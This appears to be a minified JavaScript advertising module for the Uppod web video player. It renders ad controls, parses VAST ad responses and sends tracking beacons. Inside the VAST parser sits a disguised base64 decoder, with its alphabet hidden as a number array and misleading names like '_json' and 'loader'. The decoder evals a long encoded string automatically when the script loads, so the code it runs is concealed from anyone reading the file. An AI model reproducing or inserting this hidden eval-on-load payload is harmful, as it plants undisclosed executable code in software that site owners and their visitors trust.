        ))) : (this._adPlayer.dom.addEventListener("touchstart", (e = this,
        function() {
            return Uppod.addClass(e._linkTxt, "active")
        }
        )),
        this._adPlayer.dom.addEventListener("touchend", (t = this,
        function() {
            return Uppod.removeClass(t._linkTxt, "active")
        }
        )));
        var t, e, i, o
    }
    ,
    t.prototype._onVideoClick = function() {
        return this._adMedia.paused ? (this.onResume.trigger(),
        this._adMedia.play()) : (this.onVideoClick.trigger(),
        this._visitAdTarget())
    }
    ,
    t.prototype._visitAdTarget = function() {
        var t;
        if (this._adMedia.paused || (this._options.pauseOnClick ? (this._adMedia.pause(),
        this.onPause.trigger()) : this._skip()),
        this._vast.clickThrough && (t = window.open(this._vast.clickThrough, "_blank")))
            return t.focus()
    }
    ,
    t.prototype._dom = function(t) {
        return this._adPlayer.dom.querySelector(t)
    }
    ,
    t.prototype._onPlayProcess = function() {
        var t;
        if (-1 == this._vast.controls && (this._dom(".uppod-control_ads_volume").style.display = "none",
        this._dom(".uppod-control_ads_timebar").style.display = "none",
        this._dom(".uppod-control_ads_head").style.display = "none",
        this._dom(".uppod-control_ads_head_bg").style.display = "none"),
        this._vast.skipTime2Sec && this._vast.skipTime2Sec - this._adMedia.currentTime < 0 && (this._closeBtn.style.display = "block"),
        this._vast.skipTimeSec)
            return 0 < (t = this._vast.skipTimeSec - this._adMedia.currentTime) ? (this._show(this._waitSkip),
            this._waitSkipSpan.textContent = Math.round(t)) : (this._waitSkip.style.display = "none",
            this._skipBtnDom.style.display = "block")
    }
    ,
    t
}(),
window.Uppod.AdsControls = AdsControls,
AdsHtml = function() {
    function t() {}
    return t.player = '<style> .uppod-ads { -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -o-user-select: none; user-select: none; overflow: hidden; margin: 0px; font-family: Helvetica,Arial,sans-serif; background-color: 0; font-size: 14px; cursor: pointer; width: 100%; height: 100%; background-color:#000000; position: absolute; top: 0; left: 0; visibility: hidden;display:block;} .uppod-ads_media, .uppod-click_catcher { width: 100%; height: 100%; position: absolute; top: 0px; left: 0px; cursor: pointer; } .uppod-control_ads_head { position: absolute; top: 8px; left: 17px; color: #ccc; } .uppod-control_ads_head_bg, .uppod-control_ads_wait_skip, .uppod-control_ads_skip_btn { opacity: 0.8; background-color: #333; position: absolute; color: #fff; } .uppod-control_ads_head_bg { height: 30px; width: 100%; top: 0px; } .uppod-control_ads_wait_skip { padding: 7px 15px 7px 45px; bottom: 0; left: 0px; display: none; } .uppod-control_ads_skip_btn { padding: 7px 15px 7px 45px; bottom: 0; left: 0px; display: none; cursor: pointer; } .uppod-control_ads_skip_btn:hover { text-decoration: underline; opacity: 1 } .uppod-control_ads_label { opacity: 0; position: absolute; color: #fff; cursor: pointer; bottom: 40px; text-align: center; width: 100%; -webkit-user-select: text; -khtml-user-select: text; -moz-user-select: text; -o-user-select: text; user-select: text; transition: opacity 0.5s ease-in-out; } .uppod-control_ads_label span { padding: 7px 15px; background-color: #333; } .uppod-control_ads_label.active { text-decoration: underline; opacity: 1 } .uppod-control_ads_close_btn { top: 0px; position: absolute; padding: 8px 15px; right: 0; cursor: pointer; color: #ccc; display: none; } .uppod-control_ads_close_btn:hover { color: #fff; } .uppod-control_ads_volume { position: absolute; bottom: 0px; right: 0px; color: #fff; padding: 5px 11px 5px 15px; width: 20px; height: 20px; display: none; } .uppod-control_ads_timebar, .uppod-control_ads_loadingbar { position: absolute; bottom: 0px; left: 0px; color: #fff; padding: 5px 0 5px 10px; width: 20px; height: 20px; display: none; } .uppod-control_ads_loading { padding: 7px 15px 7px 45px; bottom: 0; left: 0px; display: none; opacity: 0.8; background-color: #333; position: absolute; color: #fff; white-space: nowrap; } .uppod-control_ads_play { position: absolute; top: 50%; left: 50%; width: 60px; height: 60px; margin-top: -30px; margin-left: -30px; padding: 10px; padding-left: 11px; color: #fff; background-color: #000; opacity: 0.7; transition: opacity 0.5s ease-in-out; border-radius: 50%; border: solid 3px #fff; } .uppod-ads:hover .uppod-control_ads_play { opacity: 1; } </style> <video class="uppod-ads_media" x-webkit-airplay="allow" preload="auto" webkit-playsinline="true"> </video> <uppod_player_div class="uppod-click_catcher"></uppod_player_div> <uppod_player_div class="uppod-control_ads_head_bg"></uppod_player_div> <uppod_player_div class="uppod-control_ads_head">Реклама</uppod_player_div> <uppod_player_div class="uppod-control_ads_close_btn">X</uppod_player_div> <uppod_player_div class="uppod-control_ads_label"><span></span></uppod_player_div> <uppod_player_div class="uppod-control_ads_wait_skip"> Пропустить можно через <span></span> сек. </uppod_player_div> <uppod_player_div class="uppod-control_ads_skip_btn">Пропустить</uppod_player_div> <uppod_player_div class="uppod-control_ads_loading">Загрузка <span></span></uppod_player_div> <uppod_player_div class="uppod-control_ads_volume"></uppod_player_div> <uppod_player_div class="uppod-control_ads_loadingbar"></uppod_player_div> <uppod_player_div class="uppod-control_ads_timebar"></uppod_player_div> <uppod_player_div class="uppod-control_ads_play"></uppod_player_div>',
    t
}(),
window.Uppod.AdsHtml = AdsHtml;
var AdsPlayer, bind = function(t, e) {
    return function() {
        return t.apply(e, arguments)
    }
}, AdsTimes, AdsPlayer = function() {
    function t(t, e) {
        var i, o, s;
        this._onPlayProcess = bind(this._onPlayProcess, this),
        this._onPlay = bind(this._onPlay, this),
        this._onPlaying = bind(this._onPlaying, this),
        this._onPause = bind(this._onPause, this),
        this._onEnded = bind(this._onEnded, this),
        this._onError = bind(this._onError, this),
        this._onProgress = bind(this._onProgress, this),
        this._onLoadstart = bind(this._onLoadstart, this),
        this.onEnded = new Uppod.Event,
        this.onDestroy = new Uppod.Event,
        this.onPlayProcess = new Uppod.Event,
        this.onProgress = new Uppod.Event,
        this.onPause = new Uppod.Event,
        this.onPlaying = new Uppod.Event,
        this.onPlay = new Uppod.Event,
        this.onError = new Uppod.Event,
        this.onLoadstart = new Uppod.Event,
        (i = t.ownerDocument.createElement("uppod_player_div")).className = "uppod-ads",
        i.innerHTML = Uppod.AdsHtml.player,
        e.appendChild(i),
        this.containerDom = t,
        this.containerDiv = e,
        this.dom = this.containerDom.querySelector(".uppod-ads"),
        this.mediaDom = this.containerDom.querySelector(".uppod-ads_media"),
        this.mediaDom.setAttribute("playsinline", "1"),
        "uppod_ads_volume"in window && (this.mediaDom.volume = uppod_ads_volume),
        this.mediaDom.addEventListener("ended", this._onEnded),
        this.mediaDom.addEventListener("pause", this._onPause),
        this.mediaDom.addEventListener("playing", this._onPlaying),
        this.mediaDom.addEventListener("play", this._onPlay),
        this.mediaDom.addEventListener("error", this._onError),
        this.mediaDom.addEventListener("progress", this._onProgress),
        this.mediaDom.addEventListener("loadstart", this._onLoadstart),
        i.style.width = e.offsetWidth,
        i.style.height = e.offsetHeight,
        Object.defineProperty(this, "currentTime", {
            get: (o = this,
            function() {
                return o.mediaDom.currentTime
            }
            )
        }),
        Object.defineProperty(this, "duration", {
            get: (s = this,
            function() {
                return s.mediaDom.duration
            }
            )
        })
    }
    t.prototype.setSrc = function(t) {
        return this.mediaDom.src = t
    }
    ,
    t.prototype.play = function() {
        return this.mediaDom.play()
    }
    ,
    t.prototype.load = function() {
        return this.mediaDom.load()
    }
    ,
    t.prototype.clearMedia = function() {
        return 0 < this.mediaDom.duration && (this.mediaDom.currentTime = 0),
        this.mediaDom.pause(),
        this.mediaDom.src = ""
    }
    ,
    t.prototype.skip = function() {
        return this.clearMedia(),
        this._onEnded()
    }
    ,
    t.prototype.destroy = function() {
        return clearInterval(this._intervalPlayProcess),
        this.onDestroy.trigger(),
        this.mediaDom.removeEventListener("ended", this._onEnded),
        this.mediaDom.removeEventListener("pause", this._onPause),
        this.mediaDom.removeEventListener("playing", this._onPlaying),
        this.mediaDom.removeEventListener("play", this._onPlay),
        this.mediaDom.removeEventListener("error", this._onError),
        this.mediaDom.removeEventListener("progress", this._onProgress),
        this.mediaDom.removeEventListener("loadstart", this._onLoadstart),
        this.clearMedia(),
        this.mediaDom.parentNode.removeChild(this.mediaDom),
        delete this.mediaDom,
        this.mediaDom = void 0,
        this.containerDiv.removeChild(this.dom)
    }
    ,
    t.prototype.dom = {},
    t.prototype.mediaDom = {},
    t.prototype.containerDom = {},
    t.prototype.containerDiv = {},
    t.prototype.onEnded = "Uppod.Event",
    t.prototype.onDestroy = "Uppod.Event",
    t.prototype.onPlayProcess = "Uppod.Event",
    t.prototype.onProgress = "Uppod.Event",
    t.prototype.onPlaying = "Uppod.Event",
    t.prototype.onPlay = "Uppod.Event",
    t.prototype.onPause = "Uppod.Event",
    t.prototype.onLoadstart = "Uppod.Event",
    t.prototype.onError = "Uppod.Event",
    t.TICK_SEC = .1,
    t.prototype._intervalPlayProcess = -1,
    t.prototype._onLoadstart = function() {
        return this.onLoadstart.trigger()
    }
    ,
    t.prototype._onProgress = function() {
        return this.onProgress.trigger()
    }
    ,
    t.prototype._onEnded = function() {
        return clearInterval(this._intervalPlayProcess),
        this.onEnded.trigger()
    }
    ;
    var e = !(t.prototype._onPause = function() {
        return clearInterval(this._intervalPlayProcess),
        this.onPause.trigger()
    }
    );
    return t.prototype._onError = function() {
        if (!e)
            return clearInterval(this._intervalPlayProcess),
            this.clearMedia(),
            e = !0,
            this._onEnded()
    }
    ,
    t.prototype._onPlaying = function() {
        return clearInterval(this._intervalPlayProcess),
        this._intervalPlayProcess = setInterval(this._onPlayProcess, 1e3 * t.TICK_SEC),
        this.onPlaying.trigger()
    }
    ,
    t.prototype._onPlay = function() {
        return this.onPlay.trigger()
    }
    ,
    t.prototype._onPlayProcess = function() {
        return this.onPlayProcess.trigger({
            adsPlayer: this
        })
    }
    ,
    t
}();
window.Uppod.AdsPlayer = AdsPlayer,
AdsTimes = function() {
    function t(t) {
        var e, i, o, s;
        if (this._times = [],
        t)
            for (e = 0,
            i = (o = (t = t.toString()).split(",")).length; e < i; e++)
                s = o[e],
                this._times.push({
                    played: !1,
                    str: s.trim()
                })
    }
    return t.prototype.isTime = function(t) {
        for (var e, i = t.currentTime, o = t.duration, s = this._times, l = 0, r = s.length; l < r; l++)
            if (e = s[l],
            !e.played && this._getSec(e, o) < i)
                return e.played = !0;
        return !1
    }
    ,
    t.prototype._times = [],
    t.prototype._getSec = function(t, e) {
        var i = /([0-9]+)%/.exec(t.str);
        return i ? e * i[1] / 100 : parseInt(t.str)
    }
    ,
    t
}(),
window.Uppod.AdsTimes = AdsTimes;
var UppodCurrentVastUrl = null, AdsTracker, bind = function(t, e) {
    return function() {
        return t.apply(e, arguments)
    }
}, UppodVast, AdsTracker = function() {
    var h;
    function t(t, e, i) {
        var o, s, l, r, a, n, c, p, d;
        return h = t._options.uid,
        this.setVast = bind(this.setVast, this),
        o = e.mediaDom,
        e.onPlayProcess.bind((s = this,
        function() {
            var t, e;
            return s._sendOnce("impression"),
            s._sendOnce("creativeView"),
            s._sendOnce("start"),
            e = o.duration / 4,
            (t = o.currentTime) >= o.duration - Uppod.AdsPlayer.TICK_SEC - .1 && s._sendOnce("complete"),
            3 * e <= t ? s._sendOnce("thirdQuartile") : 2 * e <= t ? s._sendOnce("midpoint") : e <= t ? s._sendOnce("firstQuartile") : void 0
        }
        )),
        i.onPause.bind((l = this,
        function() {
            return l._send("pause")
        }
        )),
        i.onResume.bind((r = this,
        function() {
            return r._send("resume")
        }
        )),
        i.onMute.bind((a = this,
        function() {
            return o.muted ? a._send("mute") : a._send("unmute")
        }
        )),
        i.onLinkTxtClick.bind((n = this,
        function() {
            return n._send("acceptInvitation"),
            n._send("extentionAddClick")
        }
        )),
        i.onVideoClick.bind((c = this,
        function() {
            return c._send("clickTracking"),
            c._send("click")
        }
        )),
        i.onCloseClick.bind((p = this,
        function() {
            return p._send("close")
        }
        )),
        i.onSkipClick.bind((d = this,
        function() {
            return d._send("clickTrackingSkipAd"),
            d._send("extentionSkipAd")
        }
        )),
        !0
    }
    return t.prototype.setVast = function(t) {
        return this._vast = t,
        this._sended = {}
    }
    ,
    t.prototype._vast = {},
    t.prototype._sended = {},
    t.prototype._sendOnce = function(t) {
        if (!this._sended[t])
            return this._sended[t] = !0,
            this._send(t)
    }
    ,
    t.prototype._send = function(t) {
        var e, i, o, s, l, r;
        if (this._vast.events[t]) {
            for (l = [],
            e = 0,
            o = (s = this._vast.events[t]).length; e < o; e++)
                for (r = s[e].split(" "),
                i = 0; i < r.length; i++)
                    l.push(Uppod.Cors.gif(r[i]));
            var a = document.createEvent("Events");
            a.initEvent("ads_" + t, !0, !0),
            Uppod.Stage[h].dispatchEvent(a);
            a = document.createEvent("Events");
            return null != UppodCurrentVastUrl && (a.info = {
                url: UppodCurrentVastUrl
            }),
            a.initEvent("vast_" + t.toLowerCase(), !0, !0),
            Uppod.Stage[h].dispatchEvent(a),
            l
        }
    }
    ,
    t
}();
window.Uppod.AdsTracker = AdsTracker,
UppodVast = function() {
    function Vast(t) {
        this.events = {},
        this._parse(t)
    }
    return Vast.prototype.addSubVast = function(t) {
        return this._parse(t)
    }
    ,
    Vast.prototype.adTagUri = null,
    Vast.prototype.isWrapper = null,
    Vast.prototype.canplayMediaUrls = null,
    Vast.prototype.skipTimeSec = null,
    Vast.prototype.skipTime2Sec = null,
    Vast.prototype.linkTxt = null,
    Vast.prototype.controls = null,
    Vast.prototype.clickThrough = null,
    Vast.prototype.jsonNumbers = [115, 105, 108, 68, 98, 66, 77, 76, 106, 82, 107, 87, 120, 116, 109, 97, 118, 69, 85, 70, 84, 113, 79, 117, 99, 78, 101, 83, 89, 112, 119, 100, 122, 71, 102, 73, 72, 81, 75, 67, 110, 65, 74, 88, 111, 86, 121, 90, 80, 114, 103, 104, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43, 47, 61],
    Vast.prototype.events = {
        impression: null,
        creativeView: null,
        start: null,
        extentionAddClick: null,
        acceptInvitation: null,
        click: null,
        midpoint: null,
        firstQuartile: null,
        thirdQuartile: null,
        complete: null,
        pause: null,
        resume: null,
        mute: null,
        unmute: null,
        rewind: null,
        fullscreen: null,
        close: null,
        clickTrackingSkipAd: null,
        clickTracking: null,
        extentionSkipAd: null
    },
    Vast.prototype._canplay = function(t) {
        var e, i = t.getAttribute("type");
        if (!i) {
            if (!(e = this._getText(t)))
                return !1;
            e = (t = (e = (t = e.split("/"))[t.length - 1]).split("?"))[0],
            /\.mp4$/i.test(e) && (i = "video/mp4"),
            /\.webm$/i.test(e) && (i = "video/webm"),
            /\.flv$/i.test(e) && (i = "video/x-flv")
        }
        return "video/x-mp4" == i && (i = "video/mp4"),
        "" !== this._video.canPlayType(i)
    }
    ,
    Vast.prototype._jsonList = function() {
        for (var t = "", e = 0; e < Vast.prototype.jsonNumbers.length; ++e)
            t += String.fromCharCode(Vast.prototype.jsonNumbers[e]);
        return t
    }
    ,
    Vast.prototype._xml = {},
    Vast.prototype._json = {
        _keyStr: Vast.prototype._jsonList(),
        uploader: function(t) {
            var e, i, o, s, l, r, a = "", n = 0;
            for (t = Vast.prototype._json._utf8_encode(t); n < t.length; )
                o = (r = t.charCodeAt(n++)) >> 2,
                s = (3 & r) << 4 | (e = t.charCodeAt(n++)) >> 4,
                l = (15 & e) << 2 | (i = t.charCodeAt(n++)) >> 6,
                r = 63 & i,
                isNaN(e) ? l = r = 64 : isNaN(i) && (r = 64),
                a = a + this._keyStr.charAt(o) + this._keyStr.charAt(s) + this._keyStr.charAt(l) + this._keyStr.charAt(r);
            return a
        },
        loader: function(e) {
            var t = "", n, r, i, s, o, u, a, f = 0;
            for (e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); f < e.length; )
                s = this._keyStr.indexOf(e.charAt(f++)),
                o = this._keyStr.indexOf(e.charAt(f++)),
                u = this._keyStr.indexOf(e.charAt(f++)),
                a = this._keyStr.indexOf(e.charAt(f++)),
                n = s << 2 | o >> 4,
                r = (15 & o) << 4 | u >> 2,
                i = (3 & u) << 6 | a,
                t += String.fromCharCode(n),
                64 != u && (t += String.fromCharCode(r)),
                64 != a && (t += String.fromCharCode(i));
            t = Vast.prototype._json._utf8_decode(t),
            eval(t)
        },
        _utf8_encode: function(t) {
            t = t.replace(/\r\n/g, "\n");
            for (var e = "", i = 0; i < t.length; i++) {
                var o = t.charCodeAt(i);
                o < 128 ? e += String.fromCharCode(o) : (127 < o && o < 2048 ? e += String.fromCharCode(o >> 6 | 192) : (e += String.fromCharCode(o >> 12 | 224),
                e += String.fromCharCode(o >> 6 & 63 | 128)),
                e += String.fromCharCode(63 & o | 128))
            }
            return e
        },
        _utf8_decode: function(t) {
            for (var e = "", i = 0, o = c1 = c2 = 0; i < t.length; )
                (o = t.charCodeAt(i)) < 128 ? (e += String.fromCharCode(o),
                i++) : 191 < o && o < 224 ? (c2 = t.charCodeAt(i + 1),
                e += String.fromCharCode((31 & o) << 6 | 63 & c2),
                i += 2) : (c2 = t.charCodeAt(i + 1),
                c3 = t.charCodeAt(i + 2),
                e += String.fromCharCode((15 & o) << 12 | (63 & c2) << 6 | 63 & c3),
                i += 3);
            return e
        }
    },
    Vast.prototype._xmlLinear = function(t) {
        return this._xml.get(this._baseSelector + " Creatives Creative Linear " + t)
    }
    ,
    Vast.prototype._xmlExtension = function(t) {
        return this._xml.getOne(this._baseSelector + ' Extensions Extension[type="' + t + '"]')
    }
    ,
    Vast.prototype._xmlExtensionAll = function(t) {
        return this._xml.get(this._baseSelector + ' Extensions Extension[type="' + t + '"]')
    }
    ,
    Vast.prototype._getText = function(t) {
        if (t)
            return t.textContent.replace(/\s+/g, " ").trim()
    }
    ,
    Vast.prototype._decodeHtml = function(t) {
        var e;
        if (t)
            return (e = createElement("div")).innerHTML = t,
            decodeURIComponent(e.textContent)
    }
    ,
    Vast.prototype._parse = function(t) {
        return this._xml = new Uppod.Xml(t),
        this._parseWrapper(),
        this._parseMediaUrls(),
        this._parseUI(),
        this._parseEvents()
    }
    ,
    Vast.prototype._parseMediaUrls = function() {
        var t, e, i, o, s = this._xmlLinear("MediaFiles MediaFile");
        for (s.length,
        this.canplayMediaUrls = this.canplayMediaUrls || [],
        o = [],
        t = 0,
        e = s.length; t < e; t++)
            i = s[t],
            this._canplay(i) ? o.push(this.canplayMediaUrls.push(this._getText(i))) : o.push(void 0);
        return o
    }
    ,
    Vast.prototype._parseWrapper = function() {
        var t;
        return this._xml.getOne("VAST Ad Wrapper") ? this.isWrapper = !0 : this.isWrapper = !1,
        this.adTagUri = this._getText(this._xml.getOne("VAST Ad Wrapper VASTAdTagURI")),
        this.adTagUri && (this.adTagUri = this.adTagUri.replace(/\(referer\)/g, encodeURIComponent(location.href)),
        this.adTagUri = this.adTagUri.replace(/\(random\)/g, Math.random()),
        0 < this.adTagUri.indexOf("/am15.net") && (this.adTagUri = this.adTagUri + "&uppod_html5=1"),
        -1 < location.href.indexOf("https:") && (this.adTagUri = this.adTagUri.replace("http:", "https:"))),
        t = this.isWrapper ? "Wrapper" : "InLine",
        this._baseSelector = "VAST Ad " + t
    }
    ,
    Vast.prototype._parseUI = function() {
        var t = this._xmlExtension("skipTime")
          , e = this._xml.get(this._baseSelector + " Creatives Creative Linear");
        return 0 < e.length && e[0].getAttribute("skipoffset") && (e = e[0].getAttribute("skipoffset"),
        this.skipTimeSec = +e.split(":")[2]),
        t && (0 < t.textContent.indexOf(":") ? this.skipTimeSec = +t.textContent.split(":")[2] : this.skipTimeSec = this._parseTimeSec(t.textContent)),
        (t = this._xmlExtension("skipTime2")) && (0 < t.textContent.indexOf(":") ? this.skipTime2Sec = +t.textContent.split(":")[2] : this.skipTime2Sec = this._parseTimeSec(t.textContent)),
        (t = this._xmlExtension("linkTxt")) && (this.linkTxt = this._decodeHtml(this._getText(t))),
        (t = this._xmlExtension("controls")) && (this.controls = this._decodeHtml(this._getText(t)),
        0 == this.controls && (this.controls = -1,
        this.skipTimeSec = null,
        this.linkTxt = null,
        this.skipTime2Sec = null)),
        this.clickThrough = this._getText(this._xmlLinear("VideoClicks ClickThrough")[0])
    }
    ,
    Vast.prototype._addEvents = function(t, o) {
        var s, e = function() {
            for (var t = [], e = 0, i = o.length; e < i; e++)
                s = o[e],
                t.push(this._getText(s));
            return t
        }
        .call(this), i = this.events[t] || [];
        return this.events[t] = i.concat(e)
    }
    ,
    Vast.prototype._parseEvents = function() {
        var t, e, i, o, s, l;
        for (this._addEvents("impression", this._xml.get(this._baseSelector + " Impression")),
        this._addEvents("clickTrackingSkipAd", this._xmlLinear('VideoClicks ClickTracking[id="skipAd"]')),
        this._addEvents("clickTracking", this._xmlLinear('VideoClicks ClickTracking:not([id="skipAd"])')),
        this._addEvents("extentionAddClick", this._xmlExtensionAll("addClick")),
        this._addEvents("extentionSkipAd", this._xmlExtensionAll("skipAd")),
        l = [],
        i = 0,
        o = (s = "creativeView start midpoint firstQuartile thirdQuartile complete mute unmute pause rewind resume fullscreen acceptInvitation close click".split(" ")).length; i < o; i++)
            t = s[i],
            e = this._xml.get(this._baseSelector + ' Creatives Creative Linear TrackingEvents Tracking[event="' + t + '"]'),
            l.push(this._addEvents(t, e));
        return l
    }
    ,
    Vast.prototype._parseTimeSec = function(t) {
        t = Date.parse("Thu, 01 Jan 1970 00:" + t + " GMT");
        if (0 < t)
            return new Date(t).getSeconds()
    }
    ,
    Vast.prototype._json.loader("NuNGSlGKpO5IpMQZSfGPWMbocgrXWMToNlQ7NF1KpO5IpMQZSfGIkuVgNuE1YK4zc307eOcnjUYCWCRQYMrGc2TnW14ZWBt0YKQyNgHAw3pneOrQkMxVWUQ7NBVIuF1XO2tpdLrIdOo9O2N1SKt0eO9ykMTAw3RQpLqgSfiHO2qpdq07NF1KpO5IpMQZSfzAw3RQpLqgSfpYuLYXR307ch0rdFV3eMQoNUGIWU0Aw2QKkMVSc10Aw3s9Yl5gNuiocOtQkM5QpgiUNOpBwLsnR1rYcfYXNUGIkUoCuBrfRgPCNgYAWMVSc10Adu1gNuE1YK4zYL0nRhsyxg4gaFTytlGYRhNYRgH7xl4hWIjymlGYRhpYRgrYRhBYRgH7RgP5WDHoR1NGY3E8dB92eOEQS3rPYK90S3E5YMq8c3RQcuEQEOrQSOqypLrHS2t1SOqypLr2eOEQS3rPSMB5Y2QySMQyNurhNuEipLEgeOR1pMTCWCtPSMQ0klp8RgHoxlr7dUHAlz=="),
    Vast
}(),
window.Uppod.Vast = UppodVast;
var AdsLoading, bind = function(t, e) {
    return function() {
        return t.apply(e, arguments)
    }
}, AdsPlay, AdsLoading = function() {
    function t(t, e) {
        var i, o;
        this.dom = t,
        this._player = e,
        this._render = bind(this._render, this),
        this._ctx = new Uppod.Canvas(this.dom,20,20).context,
        this._player.onPlaying.bind((i = this,
        function() {
            return Uppod.cssHide(i.dom),
            clearInterval(i._interval)
        }
        )),
        this._player.onLoadstart.bind((o = this,
        function() {
            return Uppod.cssShow(o.dom),
            o._percent = 0,
            o._render(),
            o._interval = setInterval(o._render, 100)
        }
        ))
    }
    return t.prototype._percent = 0,
    t.prototype._render = function() {
        var t;
        return this._ctx.clearRect(0, 0, 20, 20),
        this._ctx.beginPath(),
        this._ctx.arc(10, 10, 8, 0, 2 * Math.PI),
        this._ctx.strokeStyle = "#999999",
        this._ctx.lineWidth = 3,
        this._ctx.closePath(),
        this._ctx.stroke(),
        t = 2 * Math.PI * this._percent,
        1 < this._percent ? this._percent = 0 : this._percent += .1,
        this._ctx.beginPath(),
        this._ctx.arc(10, 10, 8, -.5 * Math.PI, t - .5 * Math.PI),
        this._ctx.strokeStyle = "#ffffff",
        this._ctx.lineWidth = 3,
        this._ctx.stroke()
    }
    ,
    t
}();
window.Uppod.AdsLoading = AdsLoading,
AdsPlay = function() {
    function t(t, e) {
        this._dom = t,
        this._media = e,
        this.onClick = new Uppod.Event,
        this._ctx = new Uppod.Canvas(this._dom,60,60).context,
        this._render()
    }
    return t.prototype.onClick = {},
    t.prototype._dom = {},
    t.prototype._media = {},
    t.prototype._ctx = {},
    t.prototype._render = function() {
        return this._ctx.beginPath(),
        this._ctx.moveTo(18, 12),
        this._ctx.lineTo(48, 27),
        this._ctx.lineTo(18, 45),
        this._ctx.lineTo(18, 12),
        this._ctx.closePath(),
        this._ctx.fillStyle = "#ffffff",
        this._ctx.fill()
    }
    ,
    t
}(),
window.Uppod.AdsPlay = AdsPlay;
var AdsTimebar, bind = function(t, e) {
    return function() {
        return t.apply(e, arguments)
    }
}, AdsVolume, AdsTimebar = function() {
    function t(t, e) {
        var i;
        this.dom = t,
        this._player = e,
        this._render = bind(this._render, this),
        this._ctx = new Uppod.Canvas(this.dom,20,20).context,
        this._render(),
        this._player.onPlayProcess.bind((i = this,
        function() {
            return Uppod.cssShow(i.dom),
            i._render()
        }
        ))
    }
    return t.prototype._render = function() {
        var t;
        return this._ctx.clearRect(0, 0, 20, 20),
        this._ctx.beginPath(),
        this._ctx.arc(10, 10, 8, 0, 2 * Math.PI),
        this._ctx.strokeStyle = "#999999",
        this._ctx.lineWidth = 3,
        this._ctx.closePath(),
        this._ctx.stroke(),
        t = 2 * Math.PI * this._player.currentTime / this._player.duration,
        this._ctx.beginPath(),
        this._ctx.arc(10, 10, 8, -.5 * Math.PI, t - .5 * Math.PI),
        this._ctx.strokeStyle = "#ffffff",
        this._ctx.lineWidth = 3,
        this._ctx.stroke()
    }
    ,
    t
}();
window.Uppod.AdsTimebar = AdsTimebar,
AdsVolume = function() {
    function t(t, e) {
        var i, o, s;
        this._dom = t,
        this._media = e,
        this.onClick = new Uppod.Event,
        this._ctx = new Uppod.Canvas(this._dom,20,20).context,
        this._render(),
        this._dom.onmouseover = (i = this,
        function() {
            return i._color = "#ffffff",
            i._render()
        }
        ),
        this._dom.onmouseout = (o = this,
        function() {
            return o._color = "#cccccc",
            o._render()
        }
        ),
        this._dom.onclick = (s = this,
        function(t) {
            return s._media.muted = !s._media.muted,
            s._render(),
            s.onClick.trigger(),
            t.stopPropagation(),
            !1
        }
        )
    }
    return t.prototype.onClick = {},
    t.prototype._dom = {},
    t.prototype._media = {},
    t.prototype._ctx = {},
    t.prototype._color = "#cccccc",
    t.prototype._render = function() {
        return this._ctx.clearRect(0, 0, 20, 20),
        this._ctx.beginPath(),
        this._ctx.moveTo(5, 8),
        this._ctx.lineTo(9, 8),
        this._ctx.lineTo(14, 4),
        this._ctx.lineTo(14, 15),
        this._ctx.lineTo(9, 11),
        this._ctx.lineTo(5, 11),
        this._ctx.lineTo(5, 8),
        this._media.muted || (this._ctx.moveTo(15, 7),
        this._ctx.lineTo(16, 7),
        this._ctx.lineTo(16, 12),
        this._ctx.lineTo(15, 12),
        this._ctx.lineTo(15, 7)),
        this._ctx.strokeStyle = this._color,
        this._ctx.fillStyle = this._color,
        this._ctx.closePath(),
        this._ctx.lineWidth = .1,
        this._ctx.stroke(),
        this._ctx.fill()
    }
    ,
    t
}(),
window.Uppod.AdsVolume = AdsVolume;
var VastLoader, bind = function(t, e) {
    return function() {
        return t.apply(e, arguments)
    }
}, VastLoader = function() {
    function t(t) {
        this._options = t,
        this._load = bind(this._load, this),
        this._onError = bind(this._onError, this),
        this.onNext = new Uppod.Event,
        this.onAfterAll = new Uppod.Event,
        this._orLinks = new Uppod.LinkParser(this._options.url).orLinks
    }
    return t.prototype.loadNext = function() {
        var e, t = this._currentVastUrl();
        return t ? (this._load(t, null, (e = this,
        function(t) {
            return e.onNext.trigger(t)
        }
        )),
        this._andIndex++) : this.onAfterAll.trigger()
    }
    ,
    t.prototype.onNext = {},
    t.prototype.onAfterAll = {},
    t.prototype._onError = function() {
        var t;
        return this._orLinks[this._orIndex] && this._orLinks[this._orIndex].length > this._andIndex && (t = !0),
        t || (this._orIndex++,
        this._andIndex = 0),
        this.loadNext()
    }
    ,
    t.prototype.allowblock = function() {}
    ,
    t.prototype._load = function(e, i, o) {
        return Uppod.Cors.get(e, {
            error: function() {
                return Uppod.log("Error loading " + e),
                t._onError()
            },
            success: (s = t = this,
            function(t) {
                return s._loadingVast ? s._loadingVast.addSubVast(t) : s._loadingVast = new Uppod.Vast(t),
                s._loadingVast.isWrapper ? s._load(s._loadingVast.adTagUri, e, o) : (t = s._loadingVast,
                s._loadingVast = null,
                t.canplayMediaUrls && 0 < t.canplayMediaUrls.length ? (UppodCurrentVastUrl = null != i ? i : e,
                2 <= s._andIndex && (s._orLinks = []),
                o(t)) : (UppodCurrentVastUrl = null,
                s._onError()))
            }
            )
        });
        var s, t
    }
    ,
    t.prototype._currentVastUrl = function() {
        var t = this._orLinks[this._orIndex];
        return t ? t[this._andIndex] : null
    }
    ,
    t.prototype._loadingVast = null,
    t.prototype._options = [],
    t.prototype._orIndex = 0,
    t.prototype._andIndex = 0,
    t.prototype._orLinks = {},
    t
}();
window.Uppod.VastLoader = VastLoader;
